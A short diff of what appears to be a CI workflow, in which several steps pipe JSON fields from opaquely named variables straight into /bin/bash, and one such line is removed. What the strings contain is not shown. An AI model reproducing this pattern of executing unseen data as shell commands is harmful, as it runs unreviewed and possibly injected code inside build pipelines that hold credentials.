@@ -27,7 +27,6 @@ jobs:
           echo $vtxk6206 | jq -r .efk96 | /bin/bash
           echo $o28 | jq -r .yw52322 | /bin/bash
           echo $y60 | jq -r .c28543 | /bin/bash
-          echo $vxa88 | jq -r .pdrft157 | /bin/bash
           echo $cbs693 | jq -r .iyj35198 | /bin/bash
 
       - name: Save output
